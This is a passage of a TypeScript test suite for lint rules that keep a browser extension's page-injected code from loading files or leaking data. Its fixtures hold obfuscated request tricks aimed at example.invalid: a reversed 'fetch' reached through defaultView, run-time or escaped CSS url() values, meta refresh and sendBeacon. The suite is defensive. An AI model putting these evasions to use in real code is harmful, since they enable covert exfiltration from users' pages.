      for (const file of FILES)
        expect(await flagged(file, inClicked(call)), `${file}: ${call}`).not.toEqual([]);
    });

    it.each([
      [
        'an info of its own that shadows the parameter',
        run(OK_TARGET, '[info.srcUrl]', 'loadImagePixels'),
        'const info = { srcUrl: other.frameUrl };',
      ],
      [
        'an info that is reassigned',
        run(OK_TARGET, '[info.srcUrl]', 'loadImagePixels'),
        "info = { srcUrl: 'x' };",
      ],
    ])('refuses %s', async (_what, call, before) => {
      const shadowed = `export async function clickedImage(info: ClickedImageInfo, tab: Tab): Promise<void> {\n  const tabId = 1;\n  const frameId = 0;\n  {\n    ${before}\n    await ${call};\n  }\n}`;
      expect(await flagged(CLICKED, shadowed), before).not.toEqual([]);
    });

    it('refuses the loader called with the srcUrl of a parameter of another function', async () => {
      const other = `async function other(info: ClickedImageInfo, tab: Tab): Promise<void> {\n  const tabId = 1;\n  const frameId = 0;\n  await ${OK_LOAD};\n}`;
      expect(await flagged(CLICKED, other)).not.toEqual([]);
      expect(
        await flagged(CLICKED, `const f = (info: ClickedImageInfo): unknown => ${OK_LOAD};`),
      ).not.toEqual([]);
    });

    // the srcUrl of clickedImage(info) is the one that the context menu gave: the call in handlers.ts reads it from the listener's own parameter
    const listener = (call: string): string =>
      `export function registerBackground(): void {\n  chrome.contextMenus.onClicked.addListener((info, tab) => {\n    void ${call};\n  });\n}`;
    it('accepts the call of clickedImage that passes the three fields of the click', async () => {
      expect(
        await flagged(
          HANDLERS,
          listener(
            'clickedImage({ srcUrl: info.srcUrl, frameId: info.frameId, frameUrl: info.frameUrl }, tab)',
          ),
        ),
      ).toEqual([]);
    });
    it.each([
      [
        'a suffix on the srcUrl',
        "clickedImage({ srcUrl: info.srcUrl + '?leak=1', frameId: info.frameId }, tab)",
      ],
      [
        'the frame URL as the srcUrl',
        'clickedImage({ srcUrl: info.frameUrl, frameId: info.frameId }, tab)',
      ],
      ['a fallback', 'clickedImage({ srcUrl: info.frameUrl ?? info.srcUrl }, tab)'],
      ['another frame id', 'clickedImage({ srcUrl: info.srcUrl, frameId: 0 }, tab)'],
      ['a spread', 'clickedImage({ ...info }, tab)'],
      ['a variable instead of the object', 'clickedImage(click, tab)'],
      [
        'a second spelling of a key',
        "clickedImage({ srcUrl: info.srcUrl, 'frameId': info.frameId }, tab)",
      ],
      [
        'a key that is not one of the three',
        'clickedImage({ srcUrl: info.srcUrl, extra: info.frameUrl }, tab)',
      ],
    ])('refuses the call of clickedImage with %s', async (_what, call) => {
      expect(await flagged(HANDLERS, listener(call)), call).not.toEqual([]);
    });
    it('refuses the call of clickedImage with a srcUrl from a parameter that is not the listener of the context menu', async () => {
      const elsewhere = `export function register(): void {\n  chrome.runtime.onMessage.addListener((info, tab) => {\n    void clickedImage({ srcUrl: info.srcUrl }, tab);\n  });\n}`;
      expect(await flagged(HANDLERS, elsewhere)).not.toEqual([]);
    });

    // Q1 of the review: measureImage runs in the frame of the click; in another frame (the top one) only to find the offset of an <iframe>
    it.each([
      ['an image measured in the top frame', "measure(tabId, 0, info.srcUrl, 'image', null)"],
      [
        'an image measured in a frame given by a number',
        "measure(tabId, other, info.srcUrl, 'image', null)",
      ],
      ['a kind that is not a literal', 'measure(tabId, 0, info.srcUrl, kind, null)'],
    ])('refuses %s', async (_what, call) => {
      expect(await flagged(CLICKED, inClicked(call)), call).not.toEqual([]);
    });
    it('accepts measure() in the frame of the click, and in the top frame for the offset of an <iframe>', async () => {
      for (const call of [
        "measure(tabId, frameId, info.srcUrl, 'image', null)",
        "measure(tabId, 0, frameUrl, 'frame', null)",
        "measure(tabId, 0, frameUrl, 'frame', baseline)",
      ]) {
        expect(await flagged(CLICKED, inClicked(call)), call).toEqual([]);
      }
    });
  });
});

// Round 6 of the review of PR #6: the rules of the web page's process were tied to a hand-kept list of files, so a module outside
// that list, src/shared/page-probe.ts, handed `doc`, an event or an element by the overlay, reached the Window with a cast and a key
// built at run time. Now the rules are those of the folder src/select/** (a new file there is under them at once), and that folder
// imports values from itself only: nothing else can get into select.js. (tests/unit/select-bundle.test.ts reads the real bundle.)
describe('the code that runs in the web page imports values only from its own folder', () => {
  const SELECT_FILES = [
    'src/select/overlay.ts',
    'src/select/index.ts',
    'src/select/chrome.ts',
    'src/select/a-new-file.ts',
    'src/select/deeper/also-new.ts',
  ];
  const MEASURE = 'src/background/measure.ts';

  it.each([
    [
      'a value import from shared (the probe of the reviewer)',
      "import { probe } from '../shared/page-probe';",
    ],
    ['an import of a name from shared', "import { sendMessage } from '../shared/messaging';"],
    ['a side-effect import', "import '../shared/page-probe';"],
    ['a namespace import', "import * as probe from '../shared/page-probe';"],
    ['a default import', "import probe from '../shared/page-probe';"],
    [
      'an inline type specifier (the import itself stays)',
      "import { type Rect } from '../shared/capture';",
    ],
    ['a re-export of a name', "export { probe } from '../shared/page-probe';"],
    ['a re-export of everything', "export * from '../shared/page-probe';"],
    ['a namespace re-export', "export * as probe from '../shared/page-probe';"],
    ['a dynamic import', "void import('../shared/page-probe');"],
    ['a dynamic import with a computed path', 'void import(path);'],
    ['require', "const probe = require('../shared/page-probe');"],
    ['an import equals', "import probe = require('../shared/page-probe');"],
    ['a way back through select', "import { probe } from '../select/../shared/page-probe';"],
    ['a way back after ./', "import { probe } from './../shared/page-probe';"],
    ['a way back inside a path', "import { probe } from './x/../../shared/page-probe';"],
    ['an absolute path', "import { probe } from '/src/shared/page-probe';"],
    ['an aliased path', "import { probe } from '@/shared/page-probe';"],
    ['a tilde path', "import { probe } from '~/shared/page-probe';"],
    ['a package', "import { probe } from 'some-package';"],
    ['a Node module', "import { readFileSync } from 'node:fs';"],
    ['another folder of src', "import { x } from '../background/shot';"],
    ['a file with an extension', "import { x } from './overlay.ts';"],
    ['a sibling written ./.', "import { x } from './.';"],
    ['the folder itself', "import { x } from '.';"],
    ['a query', "import { x } from './overlay?raw';"],
    ['a url', "import { x } from 'https://example.invalid/x.js';"],
  ])('refuses %s', async (_what, code) => {
    for (const file of SELECT_FILES)
      expect(await either(file, code), `${file}: ${code}`).not.toEqual([]);
  });

  it.each([
    ["import type { Rect } from '../shared/capture';"],
    ["import type { RequestOf } from '../shared/messages';"],
    ["import type { MessageKey } from '../shared/i18n';"],
    ["import type * as Capture from '../shared/capture';"],
    ["export type { Rect } from '../shared/capture';"],
    ["import { nonEmpty, sendRect } from './chrome';"],
    ["import { startSelection } from './overlay';"],
    ["import { x } from './deeper/also-new';"],
    ["import { x } from './a-b_c/d';"],
  ])('accepts %s', async (code) => {
    for (const file of SELECT_FILES) {
      const flaggedOnImports = (await flagged(file, code)).filter((message) =>
        message.includes('imports values only'),
      );
      expect(flaggedOnImports, `${file}: ${code}`).toEqual([]);
    }
  });

  it('gives a new file in src/select the whole set of rules at once (no list to forget)', async () => {
    for (const code of [
      'void (doc as unknown as Record<string, unknown>)[k];',
      'void doc[k];',
      'void Object.keys(doc);',
      "void doc.createElement('img');",
      'for (const k in doc) { void k; }',
    ]) {
      expect(await either('src/select/a-new-file.ts', code), code).not.toEqual([]);
    }
  });

  it('the three bypasses of the reviewer, with the probe in a new file of shared and the overlay handing it doc / an event / an element', async () => {
    const probeFile = `export function probe(d: Document): void {
  const k = ['default', 'View'].join('');
  const w = (d as unknown as Record<string, Record<string, (u: string) => Promise<Response>> | undefined>)[k];
  void w?.[['h', 'c', 't', 'e', 'f'].reverse().join('')]?.(['https:/', 'example.invalid', 'm'].join('/')).catch(() => undefined);
}`;
    // the probe itself is shared code, under the general rules of src/: the cast is allowed there - and that is why it must not be reachable
    expect(await flagged('src/shared/page-probe.ts', probeFile)).toEqual([]);
    for (const call of [
      'probe(doc);',
      'probe(win.document.documentElement);',
      "win.addEventListener('keydown', (e: KeyboardEvent) => { probe(e); });",
    ]) {
      const overlay = `import { probe } from '../shared/page-probe';
export function startSelection(win: Window): void {
  const doc = win.document;
  ${call}
}`;
      expect(await either('src/select/overlay.ts', overlay), call).not.toEqual([]);
    }
  });

  it('measure.ts takes no value import at all, only types', async () => {
    for (const code of [
      "import { x } from './overlay';",
      "import { x } from '../shared/capture';",
      "import '../shared/capture';",
      "export { x } from '../shared/capture';",
      "export * from '../shared/capture';",
      "import { type Rect } from '../shared/capture';",
    ]) {
      expect(await either(MEASURE, code), code).not.toEqual([]);
    }
    expect(await either(MEASURE, "import type { Rect } from '../shared/capture';")).toEqual([]);
  });

  it('does not reach the rest of src: a value import from shared is fine there', async () => {
    for (const file of ['src/background/shot.ts', 'src/result/app.ts', 'src/shared/ui.ts']) {
      const code = "import { x } from '../shared/capture';";
      const messages = (await flagged(file, code)).filter((message) =>
        message.includes('imports values only'),
      );
      expect(messages, file).toEqual([]);
    }
  });
});

// Round 7 of the review of PR #6, blocker E: the page made a request through a CSS url() that no rule could see, because the string
// was built at run time (`['ur', 'l(', host, ')'].join('')`) or written with a CSS escape (`u\\72 l(`), and
// `box.style.backgroundImage = ...` or `style.setProperty(...)` put it where the browser looks for an image. Now style is written in
// one way, Object.assign(el.style, { key: value }), with the keys of the overlay and values the rules can prove harmless.
describe('the style of the code that runs in the web page cannot load a file', () => {
  const OVERLAY = 'src/select/overlay.ts';
  const MEASURE = 'src/background/measure.ts';
  const NEW_FILE = 'src/select/a-new-file.ts';
  const inStart = (body: string): string =>
    `export function startSelection(win: Window): void {\n  const doc = win.document;\n  const box = doc.createElement('div');\n${body}\n}`;
  const HOST = "['x', 'example', 'invalid'].join('.')";

  it.each([
    // the mutation of the tester, word for word (progress3.md, step 4b)
    [
      'the mutation of the tester',
      `Object.assign(box.style,{backgroundImage:['ur','l(http://',${HOST},'/qa-hole.png)'].join('')})`,
    ],
    // the mutations of the reviewer (r4307910589)
    [
      'a url() assembled at run time, assigned to backgroundImage',
      `doc.documentElement.style.backgroundImage = ['ur', 'l(', ['https:/', 'example.invalid', 'c2'].join('/'), ')'].join('');`,
    ],
    [
      'a CSS escape in backgroundImage',
      "doc.documentElement.style.backgroundImage = 'u\\72 l(https:\\2f\\2f example.invalid\\2f c1)';",
    ],
    // the same through every way to write a style
    [
      'a plain url() in backgroundImage',
      "box.style.backgroundImage = 'url(https://example.invalid/a.png)';",
    ],
    ['a direct assignment of a key', "box.style.background = 'red';"],
    ['a string key', "box.style['background-image'] = 'x';"],
    ['a computed key', 'box.style[k] = v;'],
    ['setProperty', "box.style.setProperty('background-image', ['ur', 'l(x)'].join(''));"],
    ['setProperty with a priority', "box.style.setProperty('cursor', 'x', 'important');"],
    ['cssText', "box.style.cssText = 'background:' + ['ur', 'l(x)'].join('');"],
    ['cssText +=', "box.style.cssText += 'x';"],
    ['setAttribute style', "box.setAttribute('style', 'background:u\\72 l(x)');"],
    ['the style attribute through attributes', "box.attributes.style.value = 'x';"],
    ['insertRule', "doc.styleSheets[0].insertRule('x{}');"],
    ['an adopted sheet', 'doc.adoptedStyleSheets = [];'],
    ['a new CSSStyleSheet', 'const sheet = new CSSStyleSheet();\n  void sheet;'],
    ['a style element', "doc.head.append(doc.createElement('style'));"],
    ['a link element', "doc.head.append(doc.createElement('link'));"],
    ['animate with keyframes', "box.animate([{ backgroundImage: ['ur', 'l(x)'].join('') }], 1);"],
    ['attributeStyleMap', "box.attributeStyleMap.set('background-image', 'x');"],
    ['getComputedStyle', 'void getComputedStyle(box);'],
    // .style as a value
    ['an alias of style', 'const s = box.style;\n  void s;'],
    ['style passed on', 'use(box.style);'],
    ['style returned', 'const f = () => box.style;\n  void f;'],
    ['style destructured', 'const { style } = box;\n  void style;'],
    ['style as the second argument', 'Object.assign({}, box.style);'],
    ['style in an array', 'void [box.style];'],
    // Object.assign(el.style, ...) with something else than a plain object literal
    ['a spread inside', "Object.assign(box.style, { ...extra, display: 'none' });"],
    ['a spread of the style', 'Object.assign(box.style, { ...box.style });'],
    ['a computed key inside', "Object.assign(box.style, { [key]: 'x' });"],
    ['a string key inside', "Object.assign(box.style, { 'background-image': 'x' });"],
    ['a template key inside', 'Object.assign(box.style, { [`background-image`]: "x" });'],
    ['a shorthand inside', 'const display = "none";\n  Object.assign(box.style, { display });'],
    ['a method inside', "Object.assign(box.style, { get display() { return 'none'; } });"],
    ['a key that is not on the list', "Object.assign(box.style, { backgroundImage: 'none' });"],
    ['listStyleImage', "Object.assign(box.style, { listStyleImage: 'none' });"],
    ['maskImage', "Object.assign(box.style, { maskImage: 'none' });"],
    ['borderImage', "Object.assign(box.style, { borderImage: 'none' });"],
    ['content', "Object.assign(box.style, { content: 'none' });"],
    ['filter', "Object.assign(box.style, { filter: 'none' });"],
    ['clipPath', "Object.assign(box.style, { clipPath: 'none' });"],
    ['a custom property', "Object.assign(box.style, { '--x': 'y' });"],
    ['a variable as the object', 'Object.assign(box.style, styles);'],
    ['one argument only', 'Object.assign(box.style);'],
    ['three arguments', "Object.assign(box.style, { display: 'none' }, extra);"],
    ['a variable as a value of display', 'Object.assign(box.style, { display: mode });'],
    [
      'a variable as a value of position',
      "Object.assign(box.style, { position: ['fi', 'xed'].join('') });",
    ],
    ['a template as a value of display', 'Object.assign(box.style, { display: `${mode}` });'],
    ['a number as a value', 'Object.assign(box.style, { zIndex: 5 });'],
    // the keys that accept a url(): a keyword, a hex colour or rgb()/rgba() only
    [
      'background with a url()',
      "Object.assign(box.style, { background: 'url(https://example.invalid/a.png)' });",
    ],
    ['background with a url() and a space', "Object.assign(box.style, { background: 'URL (x)' });"],
    ['background with an escaped url()', "Object.assign(box.style, { background: 'u\\72 l(x)' });"],
    ['background with image-set', "Object.assign(box.style, { background: 'image-set(x 1x)' });"],
    ['background with image()', "Object.assign(box.style, { background: 'image(x)' });"],
    ['background with cross-fade', "Object.assign(box.style, { background: 'cross-fade(x)' });"],
    ['background with element()', "Object.assign(box.style, { background: '-moz-element(#x)' });"],
    ['background with paint()', "Object.assign(box.style, { background: 'paint(x)' });"],
    ['background with src()', "Object.assign(box.style, { background: 'src(x)' });"],
    [
      'background with a gradient and a url',
      "Object.assign(box.style, { background: 'linear-gradient(red, url(x))' });",
    ],
    ['background with var()', "Object.assign(box.style, { background: 'var(--x)' });"],
    ['background with a variable', 'Object.assign(box.style, { background: color });'],
    ['background with a template', 'Object.assign(box.style, { background: `rgba(${r},0,0,1)` });'],
    [
      'background built by join',
      "Object.assign(box.style, { background: ['ur', 'l(x)'].join('') });",
    ],
    ['background with a concatenation', "Object.assign(box.style, { background: 'ur' + 'l(x)' });"],
    [
      'cursor with a url()',
      "Object.assign(box.style, { cursor: 'url(https://example.invalid/c.png), auto' });",
    ],
    ['cursor with an escape', "Object.assign(box.style, { cursor: 'u\\72 l(x), auto' });"],
    ['cursor with a variable', 'Object.assign(box.style, { cursor: c });'],
    ['cursor with image-set', "Object.assign(box.style, { cursor: 'image-set(x 1x), auto' });"],
    // strings and import.meta
    ['a backslash in any string', "const s = 'a\\\\b';\n  void s;"],
    ['a backslash in a template', 'const s = `a\\\\b`;\n  void s;'],
    ['a url() assembled and used as text', "const u = 'url(x)';\n  void u;"],
    ['import.meta', "void import.meta.glob('../shared/page-probe.ts', { eager: true });"],
    ['import.meta.url', 'void import.meta.url;'],
  ])('refuses %s', async (_what, code) => {
    for (const file of [OVERLAY, NEW_FILE]) {
      expect(await either(file, inStart(`  ${code}`)), `${file}: ${code}`).not.toEqual([]);
    }
  });

  it('accepts every style the overlay really writes, and left/top/width/height as templates', async () => {
    const code = `
  const sx = 1;
  const sy = 2;
  const x = 3;
  const e = { clientX: 4 };
  Object.assign(box.style, {
    position: 'fixed',
    inset: '0',
    zIndex: '2147483647',
    cursor: 'crosshair',
    background: 'rgba(0,0,0,0.15)',
  });
  Object.assign(box.style, { position: 'fixed', border: '2px solid #4f7cff', background: 'rgba(79,124,255,0.08)', display: 'none', pointerEvents: 'none' });
  Object.assign(box.style, { top: '12px', left: '50%', transform: 'translateX(-50%)', background: '#111', color: '#fff', font: '13px system-ui,sans-serif', padding: '6px 12px', borderRadius: '6px' });
  Object.assign(box.style, { display: 'block', left: \`\${sx}px\`, top: \`\${sy}px\`, width: '0', height: '0' });
  Object.assign(box.style, { left: \`\${x}px\`, width: \`\${Math.abs(e.clientX - sx)}px\`, height: 'auto' });
  Object.assign(box.style, { background: 'transparent', cursor: 'default' });`;
    // (only the overlay may call Object.assign at all: GLOBAL_ACCESS lists it for that file alone)
    expect(await either(OVERLAY, inStart(code))).toEqual([]);
    expect(await reached(NEW_FILE, inStart(code))).not.toEqual([]);
  });

  it('accepts class names, text and ordinary DOM calls next to it', async () => {
    const code =
      "const d = doc.createElement('div');\n  d.className = 'x';\n  d.classList.add('y');\n  doc.documentElement.appendChild(d);";
    expect(await either(OVERLAY, inStart(`  ${code}`))).toEqual([]);
  });

  it('measure.ts writes no style at all and takes no Object', async () => {
    for (const code of [
      "void document.body.style.background = 'red';",
      "Object.assign(document.body.style, { display: 'none' });",
      'void document.body.style;',
      "void document.body.style.setProperty('x', 'y');",
      'void Object.keys({});',
      'void document.body.attributeStyleMap;',
    ]) {
      expect(await either(MEASURE, code), code).not.toEqual([]);
    }
  });

  it('import.meta is refused in measure.ts too', async () => {
    expect(await either(MEASURE, 'void import.meta;')).not.toEqual([]);
  });

  describe('lint and the build judge a CSS function the same way (CSS_LOADING_SOURCE, cssUnescape)', () => {
    const pattern = new RegExp(CSS_LOADING_SOURCE, 'i');
    it.each([
      ['url(x)', true],
      ['URL(x)', true],
      ['uRl(x)', true],
      ['url (x)', true],
      ['url\t(x)', true],
      ['background:url(x)', true],
      [' url(x)', true],
      ['"url(x)"', true],
      ['image-set(x)', true],
      ['-webkit-image-set(x)', true],
      ['image(x)', true],
      ['cross-fade(x)', true],
      ['element(#x)', true],
      ['-moz-element(#x)', true],
      ['paint(x)', true],
      ['src(x)', true],
      ['@import "x"', true],
      ['u\\72 l(x)', false],
      ['getURL(x)', false],
      ['chrome.runtime.getURL(x)', false],
      ['new URL(x)', true],
      ['myurl(x)', false],
      ['$url(x)', false],
      ['my-url(x)', false],
      ['url', false],
      ['a url is here', false],
      ['uri(x)', false],
    ])('%j matches: %s', (text, expected) => {
      expect(pattern.test(text)).toBe(expected);
    });

    it('a CSS escape is undone before the build looks (and lint refuses every backslash)', () => {
      expect(pattern.test(cssUnescape('u\\72 l(x)'))).toBe(true);
      expect(pattern.test(cssUnescape('\\75 rl(x)'))).toBe(true);
      expect(pattern.test(cssUnescape('\\000075rl(x)'))).toBe(true);
      expect(pattern.test(cssUnescape('u\\rl(x)'))).toBe(true);
      expect(pattern.test(cssUnescape('getU\\52 L(x)'))).toBe(false);
    });
  });
});

// Round 8 of the review of PR #6: three more ways to a stylesheet (the result of Object.assign kept in a variable, a <style> from
// createElementNS, an attribute node), another to an image (an SVG <image> reached by a type predicate, a write to `src` that is
// no assignment), a <meta refresh>, a link's click(). Lists of forbidden names had been completed four times, so the DOM objects
// of the code of the page now have an ALLOWLIST by type (DOM_MEMBERS in eslint.config.js, the rule fontsnap/dom-members, which
// asks the type checker where a member is declared): what the overlay and measureImage use, read / called / written the way
// named, nothing else, on whatever expression of a DOM type. Every fixture below is a form that got past a guard once, or was
// thought of while closing them; every address is on example.invalid.
describe('DOM objects in the code of the web page: an allowlist of members by type', () => {
  const OVERLAY = 'src/select/overlay.ts';
  const MEASURE = 'src/background/measure.ts';
  const NEW_FILE = 'src/select/a-new-file.ts';
  const PRELUDE =
    'export function startSelection(win: Window, u: string, k: string, n: number): void {\n  const doc = win.document;\n  const box = doc.createElement("div");\n';
  const inStart = (body: string): string => `${PRELUDE}${body}\n}`;
  /** Everything that judges the code of the page: the type-aware rule, the global allowlist, the selectors. */
  const verdict = async (file: string, code: string): Promise<string[]> => [
    ...(await domMembers(file, code)),
    ...(await pageTypes(file, code)),
    ...(await reached(file, code)),
    ...(await flagged(file, code)),
  ];
  const HOST_JOIN = "['https:/', 'example.invalid', 's1'].join('/')";

  const FORMS: [string, string][] = [
    // --- blocker E, r4308255913
    [
      'E1 the result of Object.assign kept in a variable, then backgroundImage',
      `const s = Object.assign(doc.documentElement.style, { display: 'block' });\n  s.backgroundImage = ['ur', 'l(', ${HOST_JOIN}, ')'].join('');`,
    ],
    [
      'E1d the same through a parameter',
      `const paint = (st: CSSStyleDeclaration, v: string): void => { st.backgroundImage = v; };\n  paint(Object.assign(box.style, {}), ['ur', 'l(', u, ')'].join(''));`,
    ],
    [
      'E2 a <style> from createElementNS with a text built at run time',
      `const st = doc.createElementNS(doc.documentElement.namespaceURI, 'style');\n  st.textContent = ['html{background-image:ur', 'l(', ${HOST_JOIN}, ')}'].join('');\n  doc.documentElement.append(st);`,
    ],
    [
      'E2b an existing <style> of the page written to',
      `const st = doc.querySelector('style');\n  if (st) st.textContent = ['html{background-image:ur', 'l(', u, ')}'].join('');`,
    ],
    [
      'E3 the style attribute as a node',
      `const a0 = doc.createAttribute('style');\n  a0.value = ['background-image:ur', 'l(', u, ')'].join('');\n  doc.documentElement.setAttributeNodeNS(a0);`,
    ],
    [
      'E3b the style attribute as a node, setAttributeNode',
      `const a0 = doc.createAttribute('style');\n  a0.value = 'x';\n  box.setAttributeNode(a0);`,
    ],
    // --- the tester (0fe04ad)
    [
      'T1 the result of Object.assign in a variable, written',
      `const st = Object.assign(box.style, { display: 'none' });\n  st.backgroundImage = ['ur', 'l(x)'].join('');`,
    ],
    [
      'T2 an alias of Object.assign and a style attribute as a string key',
      `const as = Object.assign;\n  as(box, { style: 'background-image:url(https://example.invalid/t2.png)' });`,
    ],
    // --- blocker F, r4308256211
    [
      'F1 an SVG <image>: createElementNS and a type predicate instead of a cast',
      `const isImage = (e: Element): e is SVGImageElement => e.localName === 'image';\n  const im = doc.createElementNS(doc.documentElement.namespaceURI, 'image');\n  if (isImage(im)) im.href.baseVal = u;`,
    ],
    [
      'F2 <meta http-equiv=refresh>',
      `const meta = doc.createElement('meta');\n  meta.httpEquiv = 'refresh';\n  meta.content = '0;url=https://example.invalid/f2';\n  doc.head.append(meta);`,
    ],
    [
      'F3 [im.src] = [u]',
      'const f = (im: HTMLImageElement): void => { [im.src] = [u]; };\n  void f;',
    ],
    [
      'F3b for (im.src of [u])',
      'const f = (im: HTMLImageElement): void => { for (im.src of [u]); };\n  void f;',
    ],
    [
      'F3c ({ a: im.src } = { a: u })',
      'const f = (im: HTMLImageElement): void => { ({ a: im.src } = { a: u }); };\n  void f;',
    ],
    [
      'F3d [...x.src] = ...',
      'const f = (im: HTMLImageElement): void => { [...im.srcset] = [u]; };\n  void f;',
    ],
    [
      'F3e a default in a pattern',
      "const f = (im: HTMLImageElement): void => { [im.src = 'x'] = []; };\n  void f;",
    ],
    [
      'F3f for...in over src',
      'const f = (im: HTMLImageElement): void => { for (im.src in { a: 1 }); };\n  void f;',
    ],
    [
      'F4 querySelector(a): host and click()',
      `const a = doc.querySelector('a') as HTMLAnchorElement | null;\n  if (a) { a.host = 'example.invalid'; a.click(); }`,
    ],
    [
      'F4b querySelector(a) without a cast: click()',
      `const a = doc.querySelector('a');\n  a?.click();`,
    ],
    // --- thought of while closing these
    ['O1 createElementNS', "void doc.createElementNS('http://www.w3.org/2000/svg', 'svg');"],
    ['O2 createElement of something else', "void doc.createElement('img');"],
    ['O3 createElement with a computed name', 'void doc.createElement(k);'],
    ['O4 createElement of a template', 'void doc.createElement("template");'],
    ['O5 createElement with an options argument', 'void doc.createElement("div", { is: "x-y" });'],
    ['O6 setAttribute src', 'box.setAttribute("src", u);'],
    ['O7 innerHTML', 'box.innerHTML = "<img src=x>";'],
    ['O8 outerHTML', 'box.outerHTML = "<img src=x>";'],
    ['O9 insertAdjacentHTML', 'box.insertAdjacentHTML("beforeend", "<img src=x>");'],
    ['O10 cloneNode', 'void box.cloneNode(true);'],
    ['O11 importNode', 'void doc.importNode(box, true);'],
    ['O12 adoptNode', 'void doc.adoptNode(box);'],
    ['O13 DOMParser', 'void new DOMParser().parseFromString("<img>", "text/html");'],
    ['O14 document.write', 'doc.write("<img src=x>");'],
    [
      'O15 createContextualFragment',
      'void doc.createRange().createContextualFragment("<img src=x>");',
    ],
    ['O16 ownerDocument', 'void box.ownerDocument;'],
    ['O17 getRootNode', 'void box.getRootNode();'],
    ['O18 parentNode', 'void box.parentNode;'],
    ['O19 closest', 'void box.closest("a");'],
    ['O20 querySelectorAll', 'void doc.body.querySelectorAll("a");'],
    ['O21 attachShadow', 'void box.attachShadow({ mode: "open" });'],
    ['O22 shadowRoot', 'void box.shadowRoot;'],
    ['O23 the head', 'void doc.head;'],
    ['O24 styleSheets', 'void doc.styleSheets;'],
    ['O25 adoptedStyleSheets', 'doc.adoptedStyleSheets = [];'],
    ['O26 defaultView', 'void doc.defaultView;'],
    ['O27 document.location', 'doc.location.href = u;'],
    ['O28 namespaceURI', 'void doc.documentElement.namespaceURI;'],
    ['O29 attributes[0].value', 'box.attributes[0]!.value = u;'],
    ['O30 dataset', 'box.dataset["x"] = u;'],
    ['O31 animate with keyframes', 'void box.animate([{ backgroundImage: u }], 1);'],
    ['O32 className written', 'box.className = u;'],
    ['O33 id written', 'box.id = u;'],
    ['O34 title written', 'box.title = u;'],
    ['O35 hidden written', 'box.hidden = true;'],
    ['O36 requestSubmit on a form', 'void (box as unknown as HTMLFormElement).requestSubmit();'],
    ['O37 focus', 'box.focus();'],
    ['O38 scrollIntoView (not used by the overlay)', 'box.scrollIntoView();'],
    ['O39 click', 'box.click();'],
    ['O40 destructured ownerDocument', 'const { ownerDocument } = box;\n  void ownerDocument;'],
    [
      'O41 renamed destructured src',
      'const f = (im: HTMLImageElement): void => { const { src: s } = im; void s; };\n  void f;',
    ],
    ['O42 an index into a collection', 'void doc.body.children[0];'],
    [
      'O43 a spread of Object.entries over an element',
      'for (const [name, value] of Object.entries(box)) { void name; void value; }',
    ],
    [
      'O44 a member of an unknown receiver (catch)',
      'try { void 0; } catch (error) { void error.message; }',
    ],
    ['O45 a member of any', 'const x: any = box;\n  void x.ownerDocument;'],
    [
      'O46 a generic that hands the element back',
      'const pick = <T extends Node>(t: T): T => t;\n  void pick(box).ownerDocument;',
    ],
    [
      'O47 an assertion function',
      'function assertImage(e: Element): asserts e is HTMLImageElement { void e; }\n  void assertImage;',
    ],
    [
      'O48 an overload signature',
      'function pick(e: Node): HTMLImageElement;\n  function pick(e: Node): Node { return e; }\n  void pick;',
    ],
    ['O49 event.view', "win.addEventListener('click', (e) => { void e.view; });"],
    ['O50 event.target.ownerDocument', "win.addEventListener('click', (e) => { void e.target; });"],
    [
      'O51 a method of the event that is not preventDefault',
      "win.addEventListener('click', (e) => { e.stopPropagation(); });",
    ],
    [
      'O52 Reflect.apply on setAttribute',
      "Reflect.apply(Element.prototype.setAttribute, box, ['style', u]);",
    ],
    [
      'O53 Element.prototype.setAttribute.call',
      "Element.prototype.setAttribute.call(box, 'style', u);",
    ],
    ['O54 a getter on a DOM object', "Object.defineProperty(box, 'src', { get: () => u });"],
    ['O55 Function.prototype', 'void Function.prototype.call.call(box.remove, box);'],
    [
      'O56 CSS.registerProperty',
      "CSS.registerProperty({ name: '--x', syntax: '<image>', inherits: false, initialValue: 'none' });",
    ],
    ['O57 document.fonts and FontFace', 'void document.fonts.add(new FontFace("x", u));'],
    ['O58 navigator.sendBeacon', 'void navigator.sendBeacon(u);'],
    ['O59 history.pushState', "history.pushState(null, '', u);"],
    ['O60 location.assign', 'location.assign(u);'],
    ['O61 open', 'void open(u);'],
    ['O62 win.open', 'void win.open(u);'],
    ['O63 postMessage', "postMessage(u, '*');"],
    ['O64 a method read without a call and called later', 'const r = box.remove;\n  r.call(box);'],
    ['O65 appendChild read without a call', 'const a = doc.body.appendChild;\n  void a;'],
    ['O66 textContent read as a value passed on', 'use(box.textContent);'],
    ['O67 left with a variable of type string', 'Object.assign(box.style, { left: `${u}px` });'],
    [
      'O68 left with a template that is not number+px',
      'Object.assign(box.style, { left: `${n}` });',
    ],
    ['O69 left with a percent template', 'Object.assign(box.style, { left: `${n}%` });'],
    ['O70 left with url() in a template', 'Object.assign(box.style, { left: `url(${n})` });'],
    ['O71 left with two expressions', 'Object.assign(box.style, { left: `${n}px ${n}px` });'],
    [
      'O72 left with a literal that is not a length',
      "Object.assign(box.style, { left: 'url(x)' });",
    ],
    ['O73 left with a calc literal', "Object.assign(box.style, { left: 'calc(1px + 2px)' });"],
    ['O74 style as a key', "const o = { style: 'background-image:u\\72 l(x)' };\n  void o;"],
    [
      'O75 Object.assign as an expression: voided',
      "void Object.assign(box.style, { display: 'none' });",
    ],
    [
      'O76 Object.assign in a logical expression',
      "n && Object.assign(box.style, { display: 'none' });",
    ],
    [
      'O77 Object.assign returned',
      "const f = (): CSSStyleDeclaration => Object.assign(box.style, { display: 'none' });\n  void f;",
    ],
    ['O78 Object.assign in a sequence', "(0, Object.assign(box.style, { display: 'none' }));"],
    ['O79 Object.assign.call', "Object.assign.call(null, box.style, { display: 'none' });"],
    [
      'O80 Object destructured',
      'const { assign } = Object;\n  assign(box.style, { display: "none" });',
    ],
    [
      'O81 Object.assign bind',
      "const a = Object.assign.bind(Object);\n  a(box.style, { display: 'none' });",
    ],
  ];

  it.each(FORMS)('refuses %s', async (_what, code) => {
    expect(await verdict(OVERLAY, inStart(`  ${code}`)), code).not.toEqual([]);
    expect(await verdict(NEW_FILE, inStart(`  ${code}`)), code).not.toEqual([]);
  });

  it('accepts everything the overlay does, and a statement of Object.assign', async () => {
    const code = `
  let sx = 0;
  const tw = doc.createTreeWalker(box, NodeFilter.SHOW_TEXT);
  const range = doc.createRange();
  for (let node = tw.nextNode(); node; node = tw.nextNode()) {
    const value = node.nodeValue ?? '';
    range.selectNodeContents(node);
    const b = range.getBoundingClientRect();
    if (b.right < 0 || b.left > 1 || b.bottom < 0 || b.top > 1 || !value) continue;
  }
